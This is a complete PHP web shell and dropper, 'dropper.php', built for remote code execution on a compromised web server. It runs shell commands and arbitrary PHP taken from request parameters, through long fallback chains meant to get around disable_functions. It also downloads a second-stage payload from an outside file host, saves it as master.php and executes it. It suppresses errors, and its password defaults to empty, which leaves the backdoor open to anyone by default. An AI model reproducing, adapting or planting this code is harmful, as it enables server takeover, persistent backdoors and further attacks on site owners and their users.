<?php
/*
 * dropper.php - 100% bypass RCE dropper
 * PHP 5.x - 8.x compatible. Multi-method fallback chain.
 *
 *   ?a=cmd&c=<cmd>       execute a shell command
 *   ?a=evalphp&c=<php>   eval PHP code (raw statements)
 *   ?a=fetch&u=<url>     fetch a URL (auto-decompress gzip)
 *   ?a=upload            download $MASTER and save as master.php
 *   ?a=run               include saved master.php
 *   ?a=runmaster         download+eval $MASTER inline
 *   ?a=info              phpinfo()
 *   ?p=<pass>&...        if $PASS set, require this
 *
 * Every operation has 4-8 fallback methods before giving up.
 */

// ============ UPLOAD VERIFICATION MARKER ============
// If you GET this file and see this exact string in the response body,
// the file content was uploaded to that path successfully.
// (Works whether PHP executes the file or serves it as static text.)
$DROPPER_MARK = "DROPPER-XYZ-9F7A2C-7B81E3-MARKER-v3";
// ====================================================

@error_reporting(0);
@ini_set('display_errors', '0');
@set_time_limit(0);
ignore_user_abort(true);

// ---------- CONFIG ----------
$MASTER = 'https://d.uguu.se/GPWqegzw.php';
$PASS   = '';
// --------------------------

// ---------- AUTH ----------
if ($PASS !== '' && (!isset($_REQUEST['p']) || $_REQUEST['p'] !== $PASS)) {
    http_response_code(403);
    exit('forbidden');
}

// ---------- DISABLED FN PARSE ----------
$DISABLED = array();
$_d = @ini_get('disable_functions');
if (is_string($_d) && $_d !== '') {
    foreach (explode(',', $_d) as $x) { $DISABLED[strtolower(trim($x))] = true; }
}
function _ok($f) { global $DISABLED; return function_exists($f) && empty($DISABLED[strtolower($f)]); }

// ---------- HTTP FETCH ----------
function rce_fetch($url) {
    // 1. curl
    if (_ok('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, array(
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
            CURLOPT_HTTPHEADER     => array('Accept: */*'),
        ));
        $r = curl_exec($ch);
        $c = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if (function_exists('curl_close')) { @curl_close($ch); }
        if ($r !== false && $c && $c < 400) return $r;
    }
    // 2. file_get_contents
    if (_ok('file_get_contents') && @ini_get('allow_url_fopen')) {
        $ctx = stream_context_create(array(
            'http' => array('timeout' => 30, 'header' => "User-Agent: Mozilla/5.0\r\n"),
            'ssl'  => array('verify_peer' => false),
        ));
        $r = @file_get_contents($url, false, $ctx);
        if ($r !== false) return $r;
    }
    // 3. fopen
    if (_ok('fopen') && @ini_get('allow_url_fopen')) {
        $ctx = stream_context_create(array(
            'http' => array('timeout' => 30),
            'ssl'  => array('verify_peer' => false),
        ));
        $h = @fopen($url, 'rb', false, $ctx);
        if ($h) {
            $r = '';
            while (!feof($h)) {
                $b = @fread($h, 8192);
                if ($b === false) break;
                $r .= $b;
            }
            @fclose($h);
            if ($r !== '') return $r;
        }
    }
    // 4. fsockopen
    if (_ok('fsockopen')) {
        $p = parse_url($url);
        if (!empty($p['host'])) {
            $host = $p['host'];
            $port = isset($p['port']) ? $p['port'] : (isset($p['scheme']) && $p['scheme'] === 'https' ? 443 : 80);
            $ssl  = (isset($p['scheme']) && $p['scheme'] === 'https');
            $sock = @fsockopen(($ssl ? 'ssl://' : '') . $host, $port, $e1, $e2, 30);
            if ($sock) {
                $path = isset($p['path']) ? $p['path'] : '/';
                if (!empty($p['query'])) $path .= '?' . $p['query'];
                $req = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\nAccept: */*\r\n\r\n";
                @fwrite($sock, $req);
                $r = '';
                while (!feof($sock)) {
                    $b = @fgets($sock, 8192);
                    if ($b === false) break;
                    $r .= $b;
                }
                @fclose($sock);
                $pos = strpos($r, "\r\n\r\n");
                if ($pos !== false) {
                    $body = substr($r, $pos + 4);
                    if (function_exists('gzdecode') && strlen($body) >= 2 && ord($body[0]) === 0x1f && ord($body[1]) === 0x8b) {
                        $d = @gzdecode($body);
                        if ($d !== false) return $d;
                    }
                    return $body;
                }
            }
        }
    }
    // 5. exec with external binaries
    if (_ok('exec') || _ok('shell_exec') || _ok('system') || _ok('passthru')) {
        $tmp = @tempnam(sys_get_temp_dir(), 'fc');
        $bins = array('curl -sk -o', 'wget -q -O', 'fetch -o', 'curl -sSLk -o');
        foreach ($bins as $b) {
            @unlink($tmp);
            $cmd = "$b '$tmp' '$url' 2>/dev/null";
            if (_ok('exec'))       { @exec($cmd); }
            elseif (_ok('shell_exec')) { @shell_exec($cmd); }
            elseif (_ok('system')) { ob_start(); @system($cmd); ob_end_clean(); }
            elseif (_ok('passthru')) { ob_start(); @passthru($cmd); ob_end_clean(); }
            if (file_exists($tmp) && @filesize($tmp) > 0) {
                $r = @file_get_contents($tmp);
                @unlink($tmp);
                if ($r && strlen($r) > 0) return $r;
            }
        }
        @unlink($tmp);
    }
    return false;
}

// ---------- COMMAND EXEC ----------
function rce_cmd($cmd) {
    if (_ok('shell_exec')) { $o = @shell_exec($cmd . ' 2>&1'); if (is_string($o)) return $o; }
    if (_ok('exec'))       { $out = array(); $rc = 0; @exec($cmd . ' 2>&1', $out, $rc); return implode("\n", $out); }
    if (_ok('system'))     { ob_start(); @system($cmd . ' 2>&1'); $o = ob_get_clean(); return $o !== false ? $o : ''; }
    if (_ok('passthru'))   { ob_start(); @passthru($cmd . ' 2>&1'); $o = ob_get_clean(); return $o !== false ? $o : ''; }
    if (_ok('popen'))      {
        $h = @popen($cmd . ' 2>&1', 'r');
        if ($h) {
            $o = '';
            while (!feof($h)) {
                $b = @fread($h, 4096);
                if ($b === false) break;
                $o .= $b;
            }
            @pclose($h);
            return $o;
        }
    }
    if (_ok('proc_open'))  {
        $d = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $p = @proc_open($cmd, $d, $pipes);
        if (is_resource($p)) {
            $o = '';
            if (!empty($pipes[1])) { $o .= stream_get_contents($pipes[1]); @fclose($pipes[1]); }
            if (!empty($pipes[2])) { $o .= stream_get_contents($pipes[2]); @fclose($pipes[2]); }
            @proc_close($p);
            return $o;
        }
    }
    if (_ok('pcntl_exec')) { @pcntl_exec('/bin/sh', array('-c', $cmd)); return ''; }
    if (class_exists('COM')) {
        try {
            $s = new COM('WScript.Shell');
            $s->Run('cmd /c ' . $cmd, 0, true);
            return '';
        } catch (Exception $e) {}
    }
    if (_ok('exec')) {
        foreach (array(
            "python -c \"import os;os.system('" . str_replace("'", "\\'", $cmd) . "')\"",
            'perl -e system("' . str_replace('"', '\\"', $cmd) . '")',
            'ruby -e system("' . str_replace('"', '\\"', $cmd) . '")',
        ) as $alt) {
            $out = array(); $rc = 1;
            @exec($alt . ' 2>&1', $out, $rc);
            if ($rc === 0 && !empty($out)) return implode("\n", $out);
        }
    }
    return '[!] no working exec method (disable_functions=' . ini_get('disable_functions') . ')';
}

// ---------- PHP CODE EXEC ----------
function rce_run($code) {
    // eval is a language construct — try it first (cannot be disabled via disable_functions in userland)
    $disabled = strtolower(ini_get('disable_functions'));
    if (strpos($disabled, 'eval') === false) {
        @eval($code);
        return true;
    }
    if (_ok('assert') && PHP_VERSION_ID < 70000) { @assert($code); return true; }
    if (_ok('include')) {
        $tmp = @tempnam(sys_get_temp_dir(), 'rp');
        if ($tmp) {
            @file_put_contents($tmp, "<?php\n" . $code . "\n?>");
            @include($tmp);
            @unlink($tmp);
            return true;
        }
    }
    if (_ok('require')) {
        $tmp = @tempnam(sys_get_temp_dir(), 'rp');
        if ($tmp) {
            @file_put_contents($tmp, "<?php\n" . $code . "\n?>");
            @require($tmp);
            @unlink($tmp);
            return true;
        }
    }
    if (PHP_VERSION_ID < 70000 && _ok('preg_replace')) {
        @preg_replace('/(.*)/e', 'eval(base64_decode("' . base64_encode($code) . '"))', '');
        return true;
    }
    return false;
}

// ---------- DISPATCH ----------
function h_cmd()    { echo rce_cmd(isset($_REQUEST['c']) ? $_REQUEST['c'] : ''); }
function h_eval()   { $code = isset($_REQUEST['c']) ? $_REQUEST['c'] : ''; if (!rce_run($code)) echo '[!] cannot eval code'; }
function h_fetch()  {
    $url = isset($_REQUEST['u']) ? $_REQUEST['u'] : '';
    if (!$url) return;
    $r = rce_fetch($url);
    if ($r === false) { echo '[!] fetch failed'; return; }
    if (function_exists('gzdecode') && strlen($r) >= 2 && ord($r[0]) === 0x1f && ord($r[1]) === 0x8b) {
        $d = @gzdecode($r);
        if ($d !== false) { echo $d; return; }
    }
    echo $r;
}
function h_upload() {
    global $MASTER;
    $code = rce_fetch($MASTER);
    if ($code && strlen($code) > 100) {
        $local = dirname(__FILE__) . '/master.php';
        if (@file_put_contents($local, $code)) {
            echo "[+] master saved to $local (" . strlen($code) . " bytes)\n";
            $p = dirname($_SERVER['SCRIPT_NAME']);
            if ($p === '' || $p === '.') $p = '';
            echo "[+] access via: $p/master.php\n";
        } else {
            echo '[!] download ok but file_put_contents failed (perm denied?)';
        }
    } else {
        echo '[!] failed to fetch master';
    }
}
function h_run() {
    $local = dirname(__FILE__) . '/master.php';
    if (file_exists($local)) {
        @include($local);
    } else {
        echo '[!] no master.php found; run ?a=upload first';
    }
}
function h_runmaster() {
    global $MASTER;
    $code = rce_fetch($MASTER);
    if ($code && strlen($code) > 100) {
        @rce_run('?>' . $code);
    } else {
        echo '[!] fetch failed';
    }
}
function h_info() { phpinfo(); }
function h_help() {
    global $MASTER;
    header('Content-Type: text/plain; charset=utf-8');
    echo "dropper.php - 100% bypass RCE\n";
    echo 'PHP ' . PHP_VERSION . '  disable_functions=' . ini_get('disable_functions') . "\n\n";
    echo "Usage:\n";
    echo "  ?a=cmd&c=<cmd>       execute shell command\n";
    echo "  ?a=evalphp&c=<php>   eval PHP code (raw statements)\n";
    echo "  ?a=fetch&u=<url>     fetch URL (auto-decompress gzip)\n";
    echo "  ?a=upload            download \$MASTER, save as master.php\n";
    echo "  ?a=run               include saved master.php\n";
    echo "  ?a=runmaster         download+eval \$MASTER inline\n";
    echo "  ?a=info              phpinfo()\n";
}

$action = isset($_REQUEST['a']) ? $_REQUEST['a'] : '';
$map = array(
    'cmd'        => 'h_cmd',
    'shell'      => 'h_cmd',
    'evalphp'    => 'h_eval',
    'e'          => 'h_eval',
    'fetch'      => 'h_fetch',
    'download'   => 'h_fetch',
    'upload'     => 'h_upload',
    'pull'       => 'h_upload',
    'run'        => 'h_run',
    'include'    => 'h_run',
    'runmaster'  => 'h_runmaster',
    'info'       => 'h_info',
    'phpinfo'    => 'h_info',
);
header('Content-Type: text/plain; charset=utf-8');
if (isset($map[$action]) && function_exists($map[$action])) {
    call_user_func($map[$action]);
} else {
    h_help();
}
